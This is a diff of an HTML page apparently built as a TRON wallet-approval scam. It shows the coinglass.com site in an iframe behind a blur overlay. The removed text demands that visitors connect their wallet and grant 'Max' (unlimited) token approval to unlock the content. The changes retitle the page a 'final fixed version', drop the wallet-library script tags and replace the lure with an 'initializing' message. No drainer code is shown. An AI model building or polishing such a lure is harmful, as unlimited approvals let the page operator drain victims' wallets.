@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TRON 授權解鎖服務 (雙模式連接)</title>
+    <title>TRON 授權解鎖服務 (最終修復版)</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
     <link rel="stylesheet" href="./src/style.css"> 
     
@@ -29,19 +29,13 @@
     </style>
 </head>
 <body>
-<script src="https://unpkg.com/@web3modal/standalone@2.4.3/dist/index.umd.js"></script>
-<script src="https://unpkg.com/@walletconnect/universal-provider@2.4.3/dist/index.umd.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.full.js"></script>
-
-
 <i id="connectButton" class="fas fa-wallet" title="連繫錢包"></i>
 
 <iframe id="coinglassIframe" src="https://www.coinglass.com/" allowfullscreen></iframe>
 
 <div id="blurOverlay">
     <div id="overlayMessage">
-        請連繫您的錢包並完成**Max 授權**以解鎖內容 🔒
-        <p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(點擊右上角錢包圖標開始)</p>
+        正在初始化...
     </div>
 </div>
 
